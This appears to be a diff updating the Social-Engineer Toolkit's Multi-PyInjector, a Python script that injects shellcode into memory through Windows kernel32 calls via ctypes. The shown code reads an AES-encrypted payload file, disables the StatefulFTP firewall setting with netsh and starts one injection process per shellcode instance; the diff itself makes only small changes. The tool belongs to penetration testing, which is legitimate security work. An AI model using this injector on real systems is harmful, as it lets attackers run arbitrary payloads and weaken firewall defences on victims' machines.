@@ -1,6 +1,6 @@
 #
 # The Social-Engineer Toolkit Multi-PyInjector revised and simplified version.
-# Version: 0.3
+# Version: 0.4
 # 
 # This will spawn only a seperate thread per each shellcode instance.
 #
@@ -16,6 +16,7 @@ import os
 import base64
 from Crypto.Cipher import AES
 import multiprocessing
+import threading
 
 # define our shellcode injection code through ctypes
 def injection(sc):
@@ -38,8 +39,8 @@ def injection(sc):
                                              ctypes.c_int(0),
                                              ctypes.pointer(ctypes.c_int(0)))
     ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
-
 if __name__ == '__main__':
+    multiprocessing.freeze_support()
     subprocess.Popen("netsh advfirewall set global StatefulFTP disable", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
     # this will be our ultimate filename we use for the shellcode generate
     # by the Social-Engineer Toolkit
@@ -51,6 +52,7 @@ if __name__ == '__main__':
             if os.path.isfile(payload_filename):
                 fileopen = file(payload_filename, "r")
                 sc = fileopen.read()
+
             # if we didn't file our shellcode path then exit out
             if not os.path.isfile(payload_filename):
                 sys.exit()
@@ -84,3 +86,4 @@ if __name__ == '__main__':
             p = multiprocessing.Process(target=injection, args=(payload,))
             jobs.append(p)
             p.start()
+
